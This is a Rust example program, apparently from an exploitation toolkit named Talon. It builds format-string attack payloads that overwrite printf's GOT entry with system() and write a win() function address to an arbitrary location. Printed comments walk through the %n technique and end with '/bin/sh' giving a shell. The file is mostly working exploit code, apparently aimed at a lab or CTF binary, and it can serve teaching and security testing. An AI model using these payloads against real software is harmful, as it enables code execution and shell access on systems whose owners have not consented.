// TALON EXAMPLE 4: Format String Exploitation
// Demonstrates: Optimized format string payload generation

use talon::fmtstr_tools::FormatString;

fn main() -> Result<(), String> {
    println!("[*] Talon Format String Example: Arbitrary Write");

    // Scenario: printf(user_input) vulnerability
    // Goal: Overwrite GOT entry to redirect execution

    // Step 1: Find format string offset (usually via fuzzing)
    let offset = 6; // e.g., 6th argument on stack is our buffer
    println!("[+] Format string offset: {}", offset);

    // Step 2: Set up targets
    let printf_got = 0x00601018_u64; // GOT entry for printf
    let system_plt = 0x00400520_u64; // Address of system() PLT stub

    println!("[+] printf@GOT: 0x{:x}", printf_got);
    println!("[+] system@PLT: 0x{:x}", system_plt);

    // Step 3: Generate optimized payload
    let mut fmtstr = FormatString::from_offset(offset);
    fmtstr.write(printf_got, system_plt);

    let payload = fmtstr.generate()?;
    println!("[+] Generated payload: {} bytes", payload.len());
    println!(
        "[+] Payload (hex): {}",
        hex::encode(&payload[..payload.len().min(64)])
    );

    // Step 4: Alternative - write to arbitrary address
    let target_addr = 0x00601100_u64;
    let target_value = 0x0000000000400686_u64; // win() function address

    let write_payload = fmtstr.generate_write_payload(target_addr, target_value);
    println!(
        "\n[*] Arbitrary write payload: {} bytes",
        write_payload.len()
    );

    // Step 5: Explain technique
    println!("\n[*] Format String Attack:");
    println!("    Vulnerable code: printf(user_input);");
    println!("    ");
    println!("    Technique: Use %n to write arbitrary values");
    println!("    1. Place target address on stack");
    println!("    2. Use %Nc to print N characters");
    println!("    3. Use %M$hhn to write byte to Mth stack argument");
    println!("    ");
    println!("    Result: printf@GOT now points to system()");
    println!("    Next printf(\"input\") becomes system(\"input\")");
    println!("    Input \"/bin/sh\" -> SHELL!");

    Ok(())
}
